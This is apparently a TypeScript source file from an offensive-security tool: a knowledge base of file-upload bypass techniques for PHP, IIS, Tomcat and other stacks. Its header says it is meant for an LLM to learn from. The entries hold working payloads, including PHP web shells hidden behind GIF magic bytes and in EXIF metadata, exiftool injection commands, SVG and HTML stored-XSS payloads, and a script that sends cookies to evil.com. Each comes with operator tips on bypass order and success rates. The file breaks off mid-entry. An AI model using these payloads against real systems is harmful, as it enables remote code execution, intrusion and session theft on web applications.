/**
 * File Upload Extension Bypass Knowledge Base
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Comprehensive knowledge base covering 80+ file upload bypass techniques
 * based on @therceman's cheat sheet, OWASP, and real-world exploitation.
 *
 * Categories:
 *   1. Extension manipulation (case, double, null byte, special chars)
 *   2. MIME type confusion (Content-Type spoofing, magic bytes)
 *   3. Polyglot files (valid in multiple formats simultaneously)
 *   4. Race conditions (TOCTOU, async processing)
 *   5. Path traversal via filename
 *   6. Tech-stack-specific bypasses (PHP, ASP.NET, Java, Node, Python)
 *   7. Post-upload exploitation chains
 *   8. WAF/filter evasion techniques
 *
 * The LLM should LEARN these techniques — not just catalog them.
 * Each technique includes: why it works, when to use it, detection signatures,
 * and chaining strategies.
 */

// ─── Types ──────────────────────────────────────────────────────────────────

export interface BypassTechnique {
  id: string;
  name: string;
  category: BypassCategory;
  subcategory: string;
  /** The actual payload or technique */
  payload: string;
  /** Why this bypass works (mechanism explanation) */
  mechanism: string;
  /** When to use this technique (conditions/indicators) */
  useWhen: string[];
  /** Target tech stacks where this is effective */
  effectiveAgainst: TechStack[];
  /** Risk level of detection */
  detectionRisk: "low" | "medium" | "high";
  /** MITRE ATT&CK technique IDs */
  mitreTechniques: string[];
  /** Chaining opportunities with other techniques */
  chainsTo: string[];
  /** Detection signatures (for blue team awareness) */
  detectionSignatures: string[];
  /** Success rate estimate based on modern stacks */
  successRate: "rare" | "occasional" | "common" | "reliable";
  /** Additional notes for operator training */
  operatorNotes: string;
}

export type BypassCategory =
  | "extension_manipulation"
  | "mime_confusion"
  | "magic_bytes"
  | "polyglot"
  | "race_condition"
  | "path_traversal"
  | "null_byte"
  | "special_characters"
  | "encoding_bypass"
  | "content_type_spoofing"
  | "metadata_injection"
  | "chunked_upload"
  | "waf_evasion"
  | "server_specific";

export type TechStack =
  | "php_apache"
  | "php_nginx"
  | "aspnet_iis"
  | "java_tomcat"
  | "java_spring"
  | "node_express"
  | "node_nextjs"
  | "python_django"
  | "python_flask"
  | "ruby_rails"
  | "go_gin"
  | "cloudflare_waf"
  | "aws_s3"
  | "azure_blob"
  | "generic";

export interface ExploitChain {
  id: string;
  name: string;
  description: string;
  /** Ordered steps in the chain */
  steps: ChainStep[];
  /** Prerequisites for this chain */
  prerequisites: string[];
  /** Final impact achieved */
  impact: "info_disclosure" | "file_read" | "rce" | "privilege_escalation" | "persistence" | "data_exfil";
  /** Difficulty rating */
  difficulty: "easy" | "medium" | "hard" | "expert";
  /** Target environments */
  targetEnvironments: TechStack[];
}

export interface ChainStep {
  order: number;
  technique: string; // References BypassTechnique.id
  description: string;
  payload: string;
  expectedResult: string;
  fallbackTechnique?: string;
}

export interface TechStackProfile {
  stack: TechStack;
  name: string;
  /** Default upload handling behavior */
  defaultBehavior: string;
  /** Common validation patterns */
  commonValidations: string[];
  /** Known weaknesses */
  weaknesses: string[];
  /** Recommended bypass order (most to least likely to succeed) */
  recommendedBypassOrder: string[];
  /** Post-upload execution methods */
  executionMethods: string[];
  /** Common file storage paths */
  storagePaths: string[];
}

// ─── Extension Manipulation Payloads ────────────────────────────────────────

export const EXTENSION_MANIPULATION_TECHNIQUES: BypassTechnique[] = [
  // Case manipulation
  {
    id: "ext-case-upper",
    name: "Uppercase Extension",
    category: "extension_manipulation",
    subcategory: "case_variation",
    payload: "shell.PHP, shell.Php, shell.pHp, shell.phP",
    mechanism: "Many blacklist filters use case-sensitive string matching. Linux filesystems are case-sensitive, so .PHP and .php are different extensions, but Apache/PHP may still execute both.",
    useWhen: ["Blacklist-based validation detected", "Linux server with Apache", "Case-sensitive filename check in application code"],
    effectiveAgainst: ["php_apache", "php_nginx"],
    detectionRisk: "low",
    mitreTechniques: ["T1036.008"],
    chainsTo: ["ext-double-extension", "mime-image-php"],
    detectionSignatures: ["Unusual extension casing in upload logs", "Mixed-case PHP extensions in web root"],
    successRate: "occasional",
    operatorNotes: "Try all case permutations: .pHp, .PhP, .PHP, .pHP, .Php, .phP. On Windows/IIS this is less effective since NTFS is case-insensitive.",
  },
  {
    id: "ext-double-extension",
    name: "Double Extension",
    category: "extension_manipulation",
    subcategory: "double_extension",
    payload: "shell.php.jpg, shell.php.png, shell.php.gif, shell.asp.jpg, shell.jsp.png",
    mechanism: "Some validators only check the last extension. Apache with mod_php may execute based on the first recognized extension. If AddHandler is configured for .php, Apache processes shell.php.jpg as PHP.",
    useWhen: ["Validator checks only last extension", "Apache with AddHandler directive", "Nginx with misconfigured location blocks"],
    effectiveAgainst: ["php_apache", "php_nginx", "aspnet_iis"],
    detectionRisk: "medium",
    mitreTechniques: ["T1036.008", "T1059.004"],
    chainsTo: ["magic-bytes-gif", "mime-image-jpeg"],
    detectionSignatures: ["Multiple extensions in filename", "Executable extension before image extension"],
    successRate: "common",
    operatorNotes: "Key insight: Apache processes extensions right-to-left until it finds one it recognizes. So shell.php.xyz will execute as PHP if .xyz is unknown. Check httpd.conf for AddHandler/AddType directives.",
  },
  {
    id: "ext-reverse-double",
    name: "Reverse Double Extension",
    category: "extension_manipulation",
    subcategory: "double_extension",
    payload: "shell.jpg.php, shell.png.php, shell.gif.php, shell.pdf.asp",
    mechanism: "If the validator checks only the first extension (less common but exists in custom code), placing the executable extension last bypasses the check while the server executes it.",
    useWhen: ["Custom validation that checks first extension", "Server executes based on last extension"],
    effectiveAgainst: ["php_apache", "node_express", "python_django"],
    detectionRisk: "medium",
    mitreTechniques: ["T1036.008"],
    chainsTo: ["content-type-image"],
    detectionSignatures: ["Executable extension as final extension after image extension"],
    successRate: "occasional",
    operatorNotes: "Less common to succeed than forward double extension, but worth trying when forward fails.",
  },
  // Null byte injection
  {
    id: "ext-null-byte",
    name: "Null Byte Injection",
    category: "null_byte",
    subcategory: "null_termination",
    payload: "shell.php%00.jpg, shell.asp%00.png, shell.php\\x00.gif",
    mechanism: "In languages with C-string handling (older PHP < 5.3.4, older Java), the null byte terminates the string. The validator sees .jpg but the filesystem writes shell.php (truncated at null).",
    useWhen: ["PHP < 5.3.4 detected", "Older Java versions", "C-based file handling libraries", "URL-decoded filenames"],
    effectiveAgainst: ["php_apache", "php_nginx", "java_tomcat"],
    detectionRisk: "high",
    mitreTechniques: ["T1036.008", "T1027"],
    chainsTo: ["ext-double-extension", "path-traversal-basic"],
    detectionSignatures: ["%00 or \\x00 in filename", "Null bytes in HTTP multipart data", "Filename length mismatch between validation and storage"],
    successRate: "rare",
    operatorNotes: "Mostly patched in modern stacks but still found in legacy applications, embedded systems, and IoT devices. Always try URL-encoded (%00) and raw null byte variants.",
  },
  // Special character injection
  {
    id: "ext-newline",
    name: "Newline Character in Extension",
    category: "special_characters",
    subcategory: "newline_injection",
    payload: "shell.php%0a.jpg, shell.php%0d.jpg, shell.php%0d%0a.jpg, shell.php\\n.jpg",
    mechanism: "Newline characters (LF %0a, CR %0d, CRLF %0d%0a) can confuse validators that process filenames line-by-line or use regex without DOTALL flag. Some filesystems silently strip or replace these characters.",
    useWhen: ["Regex-based validation without multiline handling", "Filename processed through shell commands", "Log injection possible"],
    effectiveAgainst: ["php_apache", "php_nginx", "node_express", "python_flask"],
    detectionRisk: "medium",
    mitreTechniques: ["T1036.008", "T1027"],
    chainsTo: ["ext-null-byte", "path-traversal-encoded"],
    detectionSignatures: ["URL-encoded newlines in filename", "Multiline filename in logs"],
    successRate: "occasional",
    operatorNotes: "Try all variants: %0a (LF), %0d (CR), %0d%0a (CRLF). On Linux, LF is most effective. On Windows, CRLF. Some frameworks silently strip these — check if the stored filename differs from the uploaded one.",
  },
  {
    id: "ext-tab-char",
    name: "Tab Character in Extension",
    category: "special_characters",
    subcategory: "whitespace_injection",
    payload: "shell.php%09.jpg, shell%09.php.jpg, shell.ph%09p",
    mechanism: "Tab characters (%09) can break regex patterns that don't account for whitespace within extensions. Some parsers treat tabs as delimiters, splitting the filename unexpectedly.",
    useWhen: ["Regex validation without \\s handling", "Filename parsed by shell commands", "Custom extension extraction logic"],
    effectiveAgainst: ["php_apache", "node_express", "python_flask"],
    detectionRisk: "medium",
    mitreTechniques: ["T1036.008"],
    chainsTo: ["ext-newline", "ext-space"],
    detectionSignatures: ["Tab characters in uploaded filenames", "Whitespace in file extensions"],
    successRate: "rare",
    operatorNotes: "Less commonly effective than newline but worth trying in combination. Some WAFs don't inspect tab characters in filenames.",
  },
  {
    id: "ext-space",
    name: "Trailing Space in Extension",
    category: "special_characters",
    subcategory: "whitespace_injection",
    payload: "shell.php .jpg, shell.php%20, shell.php , shell.php%20%20%20",
    mechanism: "Windows NTFS silently strips trailing spaces from filenames. Upload 'shell.php ' → stored as 'shell.php'. Linux preserves spaces but some frameworks trim them during processing.",
    useWhen: ["Windows/IIS target", "Framework that trims filenames", "Validator doesn't trim before checking"],
    effectiveAgainst: ["aspnet_iis", "php_apache", "java_tomcat"],
    detectionRisk: "low",
    mitreTechniques: ["T1036.008"],
    chainsTo: ["ext-dot-trailing", "mime-image-php"],
    detectionSignatures: ["Trailing spaces in filename", "Filename length discrepancy"],
    successRate: "occasional",
    operatorNotes: "On Windows, trailing spaces AND dots are stripped. So 'shell.php...' becomes 'shell.php'. Very reliable on IIS.",
  },
  {
    id: "ext-dot-trailing",
    name: "Trailing Dot in Extension",
    category: "special_characters",
    subcategory: "dot_manipulation",
    payload: "shell.php., shell.php.., shell.php..., shell.php....jpg",
    mechanism: "Windows NTFS strips trailing dots from filenames. Upload 'shell.php.' → stored as 'shell.php'. Validator sees the trailing dot and may not recognize .php as the extension.",
    useWhen: ["Windows/IIS target", "Validator checks for exact extension match", "Blacklist doesn't include dotted variants"],
    effectiveAgainst: ["aspnet_iis", "java_tomcat"],
    detectionRisk: "low",
    mitreTechniques: ["T1036.008"],
    chainsTo: ["ext-space", "ext-semicolon"],
    detectionSignatures: ["Trailing dots in filename", "Multiple consecutive dots"],
    successRate: "common",
    operatorNotes: "Extremely reliable on Windows. NTFS will strip ALL trailing dots and spaces. Combine with spaces: 'shell.php. . .' all becomes 'shell.php'.",
  },
  {
    id: "ext-semicolon",
    name: "Semicolon in Filename (IIS)",
    category: "special_characters",
    subcategory: "delimiter_injection",
    payload: "shell.asp;.jpg, shell.asp;filename.jpg, shell.aspx;.png",
    mechanism: "IIS 6.0 and some versions of IIS 7.x treat semicolons as parameter delimiters in URLs. The file 'shell.asp;.jpg' is served as ASP because IIS sees 'shell.asp' with parameter '.jpg'.",
    useWhen: ["IIS 6.0 or misconfigured IIS 7.x", "ASP/ASPX application", "URL-based file serving"],
    effectiveAgainst: ["aspnet_iis"],
    detectionRisk: "medium",
    mitreTechniques: ["T1036.008", "T1059.001"],
    chainsTo: ["ext-colon-ads", "path-traversal-iis"],
    detectionSignatures: ["Semicolons in uploaded filenames", "IIS request for file with semicolons"],
    successRate: "common",
    operatorNotes: "Classic IIS bypass. Even on newer IIS versions, check if the application layer processes semicolons differently from the web server.",
  },
  {
    id: "ext-colon-ads",
    name: "NTFS Alternate Data Stream (ADS)",
    category: "special_characters",
    subcategory: "ntfs_specific",
    payload: "shell.asp::$DATA, shell.php::$DATA, shell.aspx:.jpg",
    mechanism: "NTFS Alternate Data Streams allow multiple data streams per file. Appending ::$DATA accesses the default stream. Some validators don't recognize this as executable, but IIS/Windows will execute the base file.",
    useWhen: ["Windows/IIS target", "NTFS filesystem", "Validator doesn't handle ADS syntax"],
    effectiveAgainst: ["aspnet_iis"],
    detectionRisk: "high",
    mitreTechniques: ["T1036.008", "T1564.004"],
    chainsTo: ["ext-semicolon", "ext-dot-trailing"],
    detectionSignatures: ["::$DATA in filename", "Colon characters in uploaded filenames", "ADS access in file system logs"],
    successRate: "occasional",
    operatorNotes: "Only works on NTFS. The ::$DATA suffix accesses the default data stream, effectively stripping the suffix. Some WAFs specifically block this pattern.",
  },
  {
    id: "ext-hash",
    name: "Hash Character Truncation",
    category: "special_characters",
    subcategory: "url_fragment",
    payload: "shell.php#.jpg, shell.php%23.jpg",
    mechanism: "In URL contexts, # denotes a fragment identifier. If the filename is processed as a URL, everything after # is ignored. The server may store/serve 'shell.php' while the validator saw 'shell.php#.jpg'.",
    useWhen: ["Filename processed as URL", "Client-side validation only", "Framework uses URL parsing for filenames"],
    effectiveAgainst: ["node_express", "python_flask", "generic"],
    detectionRisk: "low",
    mitreTechniques: ["T1036.008"],
    chainsTo: ["ext-question-mark", "encoding-double-url"],
    detectionSignatures: ["Hash character in uploaded filename", "Fragment identifier in file path"],
    successRate: "rare",
    operatorNotes: "More effective in client-side validation bypass. Server-side, it depends on whether the framework URL-decodes the filename before or after validation.",
  },
  {
    id: "ext-question-mark",
    name: "Question Mark Query String",
    category: "special_characters",
    subcategory: "url_query",
    payload: "shell.php?.jpg, shell.php%3f.jpg",
    mechanism: "Similar to hash — if filename is treated as URL, ? starts a query string. Everything after is ignored for path resolution. Server stores 'shell.php' while validator sees full string.",
    useWhen: ["URL-based file serving", "Filename used in redirect/include", "Query string not stripped before storage"],
    effectiveAgainst: ["php_apache", "node_express", "generic"],
    detectionRisk: "low",
    mitreTechniques: ["T1036.008"],
    chainsTo: ["ext-hash", "path-traversal-encoded"],
    detectionSignatures: ["Question mark in uploaded filename"],
    successRate: "rare",
    operatorNotes: "Works best when the upload path is later used in an include() or require() that processes it as a URL.",
  },
  // Unicode/encoding bypasses
  {
    id: "ext-unicode-rtlo",
    name: "Right-to-Left Override (RTLO)",
    category: "encoding_bypass",
    subcategory: "unicode_bidi",
    payload: "shell\\u202Ephp.jpg → displays as 'shelljpg.php' visually but stored as 'shell[RTLO]php.jpg'",
    mechanism: "Unicode RTLO character (U+202E) reverses text rendering direction. The filename appears as an image to humans/validators but the actual bytes contain .php. Some systems execute based on actual bytes, not display.",
    useWhen: ["Human review of uploaded files", "Validator uses rendered filename", "Email attachment filtering"],
    effectiveAgainst: ["generic", "aspnet_iis"],
    detectionRisk: "high",
    mitreTechniques: ["T1036.002", "T1027"],
    chainsTo: ["magic-bytes-gif", "mime-image-jpeg"],
    detectionSignatures: ["Unicode bidirectional control characters in filename", "U+202E in file metadata"],
    successRate: "occasional",
    operatorNotes: "Primarily effective against human reviewers and basic string-display validators. Modern upload handlers often strip bidi control characters. Still effective in email-based attacks.",
  },
  {
    id: "ext-unicode-homoglyph",
    name: "Unicode Homoglyph Extension",
    category: "encoding_bypass",
    subcategory: "homoglyph",
    payload: "shell.ρhρ (Greek rho), shell.рhр (Cyrillic), shell.ⅾhp (Roman numeral)",
    mechanism: "Replace ASCII characters in the extension with visually identical Unicode characters. Blacklist checks for '.php' won't match '.ρhρ' (Greek rho looks like 'p'). If the server normalizes Unicode before execution, it may still execute.",
    useWhen: ["Blacklist-based extension filtering", "No Unicode normalization", "Visual inspection by humans"],
    effectiveAgainst: ["generic", "php_apache", "node_express"],
    detectionRisk: "medium",
    mitreTechniques: ["T1036.002", "T1027"],
    chainsTo: ["ext-unicode-rtlo", "encoding-double-url"],
    detectionSignatures: ["Non-ASCII characters in file extension", "Unicode normalization mismatch"],
    successRate: "rare",
    operatorNotes: "Effectiveness depends entirely on whether the server normalizes Unicode before extension checking AND before execution. Most modern frameworks handle this, but custom code often doesn't.",
  },
  {
    id: "encoding-double-url",
    name: "Double URL Encoding",
    category: "encoding_bypass",
    subcategory: "double_encoding",
    payload: "shell%252ephp (. = %2e → %252e), shell.ph%2570 (p = %70 → %2570)",
    mechanism: "If the application URL-decodes the filename twice (once at the web server, once in application code), double-encoded characters bypass first-pass validation but resolve to the malicious extension on second decode.",
    useWhen: ["Application performs double URL decoding", "WAF decodes once, app decodes again", "Proxy chain with multiple decode steps"],
    effectiveAgainst: ["php_apache", "java_tomcat", "aspnet_iis", "generic"],
    detectionRisk: "medium",
    mitreTechniques: ["T1027", "T1036.008"],
    chainsTo: ["ext-null-byte", "path-traversal-encoded"],
    detectionSignatures: ["Double-encoded characters in filename", "%25 sequences in upload data"],
    successRate: "occasional",
    operatorNotes: "Test systematically: encode the dot (%252e), the extension letters (%2570%2568%2570 for php), or both. Check if the application has multiple decode steps.",
  },
  {
    id: "ext-overlong-utf8",
    name: "Overlong UTF-8 Encoding",
    category: "encoding_bypass",
    subcategory: "utf8_overlong",
    payload: "shell.ph\\xc0\\xf0 (overlong 'p'), shell\\xc0\\xae\\xc0\\xae/etc/passwd (overlong '../')",
    mechanism: "UTF-8 allows multiple byte sequences to represent the same character (overlong encoding). Validators may not recognize overlong sequences as the target character, but some parsers normalize them before use.",
    useWhen: ["Older systems without UTF-8 validation", "Custom byte-level parsing", "IDS/WAF bypass"],
    effectiveAgainst: ["java_tomcat", "generic"],
    detectionRisk: "high",
    mitreTechniques: ["T1027", "T1036.008"],
    chainsTo: ["path-traversal-encoded", "encoding-double-url"],
    detectionSignatures: ["Overlong UTF-8 sequences in filename", "Invalid UTF-8 in upload data"],
    successRate: "rare",
    operatorNotes: "Mostly patched in modern systems. Still found in embedded devices, legacy Java applications, and custom C/C++ file handlers. RFC 3629 explicitly forbids overlong sequences.",
  },
  // PHP-specific extensions
  {
    id: "ext-php-alternatives",
    name: "PHP Alternative Extensions",
    category: "server_specific",
    subcategory: "php_extensions",
    payload: ".php3, .php4, .php5, .php7, .pht, .phtml, .phar, .phps, .pgif, .shtml, .inc",
    mechanism: "Apache may be configured to execute multiple extensions as PHP via AddHandler/AddType directives. .phtml, .pht, .php5 are commonly enabled. .phar is PHP archive format that executes. .phps shows source but confirms PHP processing.",
    useWhen: ["PHP/Apache target", ".php is blacklisted", "AddHandler directive present in httpd.conf", "PHP-FPM with broad regex"],
    effectiveAgainst: ["php_apache", "php_nginx"],
    detectionRisk: "medium",
    mitreTechniques: ["T1059.004", "T1036.008"],
    chainsTo: ["ext-double-extension", "magic-bytes-gif"],
    detectionSignatures: ["Uncommon PHP extensions in uploads", "phtml/pht/phar files in web root"],
    successRate: "common",
    operatorNotes: "ALWAYS try .phtml and .pht first — they're the most commonly overlooked. Check /etc/apache2/mods-enabled/php*.conf for which extensions are registered. .phar is especially dangerous as it's a full archive format.",
  },
  // ASP.NET specific
  {
    id: "ext-aspnet-alternatives",
    name: "ASP.NET Alternative Extensions",
    category: "server_specific",
    subcategory: "aspnet_extensions",
    payload: ".asp, .aspx, .asa, .asax, .ascx, .ashx, .asmx, .cer, .soap, .rem, .config, .cshtml",
    mechanism: "IIS maps multiple extensions to the ASP.NET ISAPI handler. .ashx (HTTP handlers), .asmx (web services), .config (web.config overwrite) can all achieve code execution. .cer is treated as ASP on some IIS configurations.",
    useWhen: ["IIS/ASP.NET target", ".aspx is blacklisted", "Handler mappings not restricted", "web.config upload possible"],
    effectiveAgainst: ["aspnet_iis"],
    detectionRisk: "medium",
    mitreTechniques: ["T1059.001", "T1036.008"],
    chainsTo: ["ext-semicolon", "ext-colon-ads"],
    detectionSignatures: ["Uncommon ASP.NET extensions in uploads", "web.config in upload directory"],
    successRate: "common",
    operatorNotes: "web.config upload is the holy grail — it can reconfigure the entire application. If you can upload to the app root, try uploading a web.config that adds a new handler mapping for your shell extension.",
  },
  // Java specific
  {
    id: "ext-java-alternatives",
    name: "Java/Tomcat Alternative Extensions",
    category: "server_specific",
    subcategory: "java_extensions",
    payload: ".jsp, .jspx, .jsw, .jsv, .jspf, .war, .jar, .class, .xml (web.xml)",
    mechanism: "Tomcat processes multiple JSP-related extensions. .jspx is JSP in XML format. .jspf is JSP fragment (included). .war deployment can overwrite entire applications. web.xml modification can add new servlet mappings.",
    useWhen: ["Tomcat/Java target", ".jsp is blacklisted", "WAR deployment endpoint accessible", "Upload to WEB-INF possible"],
    effectiveAgainst: ["java_tomcat", "java_spring"],
    detectionRisk: "high",
    mitreTechniques: ["T1059", "T1036.008"],
    chainsTo: ["ext-double-extension", "path-traversal-basic"],
    detectionSignatures: ["JSP variant extensions in uploads", "WAR/JAR files uploaded", "web.xml modifications"],
    successRate: "occasional",
    operatorNotes: "If you can upload a .war file to the Tomcat manager or auto-deploy directory, that's instant RCE. Check for /manager/html endpoint. .jspf files are executed when included by another JSP.",
  },
];

// ─── MIME Type Confusion Techniques ─────────────────────────────────────────

export const MIME_CONFUSION_TECHNIQUES: BypassTechnique[] = [
  {
    id: "mime-image-php",
    name: "Image Content-Type with PHP Body",
    category: "content_type_spoofing",
    subcategory: "mime_mismatch",
    payload: "Content-Type: image/jpeg\\n\\n<?php system($_GET['cmd']); ?>",
    mechanism: "Set Content-Type header to image/jpeg while the body contains PHP code. If the server validates only the Content-Type header (not file content/magic bytes), the PHP file is accepted and later executed.",
    useWhen: ["Server validates Content-Type header only", "No magic byte verification", "File extension determines execution"],
    effectiveAgainst: ["php_apache", "php_nginx", "node_express", "python_django"],
    detectionRisk: "medium",
    mitreTechniques: ["T1036.008", "T1059.004"],
    chainsTo: ["magic-bytes-gif", "ext-double-extension"],
    detectionSignatures: ["Content-Type mismatch with file content", "PHP tags in image upload"],
    successRate: "common",
    operatorNotes: "Always pair with magic bytes for maximum effectiveness. Many modern frameworks check both Content-Type AND magic bytes, so you need both to match the claimed type.",
  },
  {
    id: "mime-octet-stream",
    name: "application/octet-stream Bypass",
    category: "content_type_spoofing",
    subcategory: "generic_mime",
    payload: "Content-Type: application/octet-stream",
    mechanism: "application/octet-stream is the generic binary type. Some validators whitelist specific types and reject unknown ones, but others allow octet-stream as a fallback. The server then determines handling by extension.",
    useWhen: ["Whitelist allows generic binary", "Server falls back to extension-based handling", "Custom upload handler"],
    effectiveAgainst: ["generic", "node_express", "python_flask"],
    detectionRisk: "low",
    mitreTechniques: ["T1036.008"],
    chainsTo: ["ext-php-alternatives", "ext-double-extension"],
    detectionSignatures: ["application/octet-stream for non-binary uploads"],
    successRate: "occasional",
    operatorNotes: "Try this when specific MIME types are rejected. It's the 'I don't know what this is' type, and many servers just accept it.",
  },
  {
    id: "mime-svg-xss",
    name: "SVG with Embedded JavaScript",
    category: "content_type_spoofing",
    subcategory: "svg_injection",
    payload: "Content-Type: image/svg+xml\\n\\n<svg xmlns='http://www.w3.org/2000/svg'><script>alert(document.cookie)</script></svg>",
    mechanism: "SVG files are valid XML that can contain <script> tags. If uploaded SVGs are served with image/svg+xml Content-Type, browsers will execute the embedded JavaScript. This achieves stored XSS.",
    useWhen: ["SVG uploads allowed", "Files served from same origin", "No CSP or weak CSP", "Image upload feature"],
    effectiveAgainst: ["generic", "node_express", "python_django", "ruby_rails"],
    detectionRisk: "medium",
    mitreTechniques: ["T1059.007", "T1189"],
    chainsTo: ["mime-html-upload", "metadata-exif-xss"],
    detectionSignatures: ["Script tags in SVG files", "Event handlers in SVG attributes", "JavaScript in uploaded images"],
    successRate: "common",
    operatorNotes: "Even if direct script tags are filtered, try: onload/onerror attributes, foreignObject with HTML, use/xlink:href to external resources, CSS @import. SVG is incredibly versatile for XSS.",
  },
  {
    id: "mime-html-upload",
    name: "HTML File Upload for XSS/Phishing",
    category: "content_type_spoofing",
    subcategory: "html_injection",
    payload: "Content-Type: text/html\\n\\n<html><body><script>fetch('https://evil.com/steal?c='+document.cookie)</script></body></html>",
    mechanism: "If HTML files can be uploaded and served from the application's domain, they execute in the application's origin context, giving access to cookies, localStorage, and same-origin APIs.",
    useWhen: ["HTML/HTM uploads not blocked", "Files served from same origin", "No Content-Disposition: attachment header"],
    effectiveAgainst: ["generic", "aws_s3", "azure_blob"],
    detectionRisk: "medium",
    mitreTechniques: ["T1059.007", "T1189", "T1566.002"],
    chainsTo: ["mime-svg-xss", "path-traversal-basic"],
    detectionSignatures: ["HTML files in upload directory", "Script tags in uploaded files"],
    successRate: "common",
    operatorNotes: "Check if uploaded files are served with Content-Disposition: attachment (forces download) vs inline (renders in browser). If inline, you have stored XSS. Also try .htm, .xhtml, .shtml variants.",
  },
];

// ─── Magic Bytes / File Signatures ──────────────────────────────────────────

export const MAGIC_BYTES_TECHNIQUES: BypassTechnique[] = [
  {
    id: "magic-bytes-gif",
    name: "GIF89a Magic Bytes + PHP",
    category: "magic_bytes",
    subcategory: "image_polyglot",
    payload: "GIF89a;\\n<?php system($_GET['cmd']); ?>",
    mechanism: "Prepend GIF89a (the GIF file signature) to PHP code. Magic byte validators see a valid GIF header. PHP ignores the GIF header as non-PHP text and executes the <?php block. File is simultaneously valid GIF (technically) and PHP.",
    useWhen: ["Server checks magic bytes/file signature", "getimagesize() validation in PHP", "file command used for validation"],
    effectiveAgainst: ["php_apache", "php_nginx"],
    detectionRisk: "medium",
    mitreTechniques: ["T1036.008", "T1027.001"],
    chainsTo: ["ext-double-extension", "mime-image-php"],
    detectionSignatures: ["GIF header followed by PHP tags", "Polyglot file detection", "Image with embedded code"],
    successRate: "reliable",
    operatorNotes: "GIF89a is the easiest polyglot — just 6 bytes prefix. For more robust bypass, create a valid GIF with PHP in a comment block. getimagesize() will return valid dimensions.",
  },
  {
    id: "magic-bytes-png",
    name: "PNG Magic Bytes + PHP in Metadata",
    category: "magic_bytes",
    subcategory: "image_polyglot",
    payload: "\\x89PNG\\r\\n\\x1a\\n + valid IHDR chunk + PHP in tEXt/iTXt chunk",
    mechanism: "Create a valid PNG file with PHP code embedded in a tEXt or iTXt metadata chunk. The file passes all image validation (including dimension checks) while containing executable PHP in metadata that survives re-encoding.",
    useWhen: ["Strict image validation (dimensions, format)", "getimagesize() + exif_imagetype() checks", "Image not re-encoded/resized"],
    effectiveAgainst: ["php_apache", "php_nginx"],
    detectionRisk: "low",
    mitreTechniques: ["T1036.008", "T1027.001"],
    chainsTo: ["ext-php-alternatives", "mime-image-php"],
    detectionSignatures: ["PHP tags in PNG metadata chunks", "Unusual tEXt chunks in PNG"],
    successRate: "common",
    operatorNotes: "Use exiftool to inject PHP into PNG metadata: exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.png. If the server re-encodes the image (ImageMagick, GD), the payload may be stripped — try IDAT chunk injection instead.",
  },
  {
    id: "magic-bytes-jpeg-exif",
    name: "JPEG EXIF PHP Injection",
    category: "magic_bytes",
    subcategory: "image_polyglot",
    payload: "Valid JPEG with PHP in EXIF Comment/UserComment field",
    mechanism: "Embed PHP code in JPEG EXIF metadata (Comment, UserComment, or custom IFD fields). The file is a valid JPEG that passes all image checks. If later included via LFI or the extension is changed, PHP executes the embedded code.",
    useWhen: ["JPEG uploads accepted", "LFI vulnerability exists", "EXIF data preserved (no stripping)", "Image not re-processed"],
    effectiveAgainst: ["php_apache", "php_nginx"],
    detectionRisk: "low",
    mitreTechniques: ["T1036.008", "T1027.001"],
    chainsTo: ["ext-double-extension", "path-traversal-basic"],
    detectionSignatures: ["PHP tags in EXIF data", "Executable code in image metadata"],
    successRate: "common",
    operatorNotes: "Create with: exiftool -Comment='<?php system($_GET[\"c\"]); ?>' photo.jpg. Key insight: even if you can't execute the file directly, if there's an LFI anywhere in the app, you can include the uploaded image and the PHP in EXIF will execute.",
  },
  {
    id: "magic-bytes-pdf",
    name: "PDF with Embedded JavaScript",
    category: "magic_bytes",
    subcategory: "document_polyglot",
    payload: "%PDF-1.4 header + /OpenAction /JavaScript stream",
    mechanism: "PDFs can contain JavaScript that executes when opened in a PDF viewer. If the application processes uploaded PDFs (preview, thumbnail generation), the JavaScript may execute in the server context or achieve client-side XSS.",
    useWhen: ["PDF uploads accepted", "Server-side PDF processing (thumbnail, preview)", "PDFs served inline to users"],
    effectiveAgainst: ["generic", "node_express", "python_django"],
    detectionRisk: "medium",
    mitreTechniques: ["T1204.002", "T1059.007"],
    chainsTo: ["mime-html-upload", "metadata-exif-xss"],
    detectionSignatures: ["JavaScript in PDF objects", "/OpenAction or /AA in PDF", "Suspicious PDF streams"],
    successRate: "occasional",
    operatorNotes: "For server-side exploitation, target PDF processing libraries (Ghostscript CVEs, ImageMagick delegates). For client-side, embed JS that exfiltrates data when the PDF is viewed. Check if PDFs are rendered server-side for thumbnails.",
  },
];

// ─── Polyglot Files ─────────────────────────────────────────────────────────

export const POLYGLOT_TECHNIQUES: BypassTechnique[] = [
  {
    id: "polyglot-gifar",
    name: "GIFAR (GIF + JAR Polyglot)",
    category: "polyglot",
    subcategory: "multi_format",
    payload: "Valid GIF file + appended JAR/ZIP content (ZIP reads from end, GIF from start)",
    mechanism: "GIF parsers read from the start of the file, ZIP/JAR parsers read from the end. A file can be simultaneously valid GIF and valid JAR. Upload as image, reference as applet/JAR for code execution.",
    useWhen: ["Java applet context available", "Image upload + Java application", "File served with multiple Content-Types"],
    effectiveAgainst: ["java_tomcat", "java_spring"],
    detectionRisk: "high",
    mitreTechniques: ["T1027.001", "T1036.008"],
    chainsTo: ["magic-bytes-gif", "ext-java-alternatives"],
    detectionSignatures: ["ZIP signatures at end of GIF file", "Dual-format file headers"],
    successRate: "rare",
    operatorNotes: "Classic technique from 2008. Less relevant now that Java applets are dead, but the concept applies to any format that reads from the end (ZIP, DOCX, XLSX are all ZIP-based).",
  },
  {
    id: "polyglot-phar-jpeg",
    name: "PHAR/JPEG Polyglot",
    category: "polyglot",
    subcategory: "php_polyglot",
    payload: "Valid JPEG with PHAR archive appended after JPEG EOI marker",
    mechanism: "JPEG parsing stops at the EOI (End of Image) marker. Anything after is ignored by image validators. A PHAR archive appended after EOI creates a file that passes image validation but can be deserialized as PHAR, achieving RCE via phar:// wrapper.",
    useWhen: ["PHP target with phar:// wrapper accessible", "Deserialization gadget chains available", "Image upload with known storage path"],
    effectiveAgainst: ["php_apache", "php_nginx"],
    detectionRisk: "high",
    mitreTechniques: ["T1027.001", "T1059.004"],
    chainsTo: ["magic-bytes-jpeg-exif", "ext-php-alternatives"],
    detectionSignatures: ["PHAR signatures after JPEG EOI", "phar:// in application logs", "Deserialization after image upload"],
    successRate: "occasional",
    operatorNotes: "Requires a code path that uses phar:// with user-controlled input. Common in file_exists(), is_dir(), or any filesystem function that accepts phar:// URIs. Check for gadget chains in the application's dependencies.",
  },
  {
    id: "polyglot-html-image",
